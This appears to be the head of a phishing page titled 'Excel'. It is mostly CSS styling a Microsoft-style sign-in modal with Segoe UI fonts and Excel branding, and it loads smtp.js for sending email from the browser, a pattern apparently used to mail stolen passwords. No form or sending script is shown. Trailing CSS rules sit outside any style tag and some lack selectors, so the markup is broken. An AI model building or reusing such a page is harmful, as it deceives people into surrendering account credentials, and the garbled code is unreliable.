<html>
  <head>
<meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Excel</title>
    <style>
        @font-face {
            font-family: 'Segoe UI';
            src: local('Segoe UI'), local('SegoeUI');
            font-weight: normal;
            font-style: normal;
        }
        @font-face {
            font-family: 'Segoe UI';
            src: local('Segoe UI Semibold'), local('SegoeUI-SemiBold');
            font-weight: 600;
            font-style: normal;
        }
        * {
            box-sizing: border-box;
        }
        .modal-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1040;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
            flex-direction: column;
        }
        .modal-card {
            margin: 0 auto 20px;
            position: relative;
            max-width: 440px;
            width: 100%;
            padding: 44px;
            background-color: #fff;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            min-width: 320px;
            min-height: 338px;
            overflow: hidden;
        }
        .form-logo {
            height: 26px;
            margin-bottom: 1rem;
        }
        .heading {
            line-height: 1.75rem;
            color: #1b1b1b;
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .modal-header {
            display: flex;
            flex-shrink: 0;
            align-items: center;
            gap: 10px;
            background-color: #fff;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            max-width: 440px;
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 1rem;
            color: #000;
            font-weight: 500;
        }
        .earthicon {
            height: 1rem;
            margin-bottom: 1px;
            opacity: 0.75;
        }
        .modal-title {
            font-size: 15px;
            line-height: 1.2;
            opacity: 0.8;
        }
        .btn-close {
            box-sizing: content-box;
            width: 1em;
            height: 1em;
            color: #000;
            background: transparent url('')center/1em auto no-repeat;
            border: 0;
            border-radius: .25rem;
            opacity: .5;
            margin-left: auto;
        }
        .modal-body {
            padding: 1rem;
        }
        form {
            width: 100%;
        }
        .form-group {
            margin-bottom: 1rem;
        }
        label,
        .form-label {
            font-size: 0.925rem;
            font-weight: 400;
            line-height: 1.5;
            margin-bottom: .5rem;
            display: inline-block;
        }
        .form-control {
            display: block;
            width: 100%;
            padding: 6px 10px;
            padding-left: 0;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #1b1b1b;
            background-color: #fff;
            border: none;
            border-bottom: 1px solid rgba(0, 0, 0, 0.8);
            outline: none;
        }
        .form-control:focus {
            outline: 0;
            border-color: #0067b8;
        }
        .form-check {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .form-check-label,
        .form-check label {
            font-size: 0.875rem;
            color: #555;
            margin-bottom: 0;
            cursor: pointer;
        }
        .primary-btn {
            display: inline-block;
            font-weight: normal;
            font-size: 14px;
            background-color: #005da6;
            color: #fff;
            min-width: 108px;
            line-height: 1.75;
            padding: 4px 12px;
            position: relative;
            max-width: 100%;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            vertical-align: middle;
            text-overflow: ellipsis;
            touch-action: manipulation;
            outline: none;
            border: none;
        }
        .primary-btn:hover {
            background-color: #005da6;
        }
        .btn-wrap {
            text-align: right;
            padding-top: 23px;
        }
        .excel {
            font-size: 25px;
            font-weight: 600;
            color: #0F703B;
        }
        .info {
            font-size: 15px;
            color: #444;
            line-height: 1.4;
            margin-bottom: 16px;
            font-weight: 600;
        }
    </style>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>

        .modal-card {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 350px;
        }

            display: block;
            margin: 0 auto 10px;
        }

            font-size: 14px;
            margin-bottom: 15px;
        }

            margin-bottom: 15px;
        }

        .form-control {
            display: block;
            width: 100%;
            padding: 6px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555;
            background-color: #fff;
            background-image: none;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        .form-check-label {
            font-size: 14px;
        }

        .btn-wrap {
            margin-top: 15px;
        }

        #submit {
            display: inline-block;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 400;
            line-height: 1.42857143;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            cursor: pointer;
            background-color: #007acc;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            text-decoration: none;
            transition: background-color 0.3s;
        }

        #submit:hover {
            background-color: #005da6;
        }
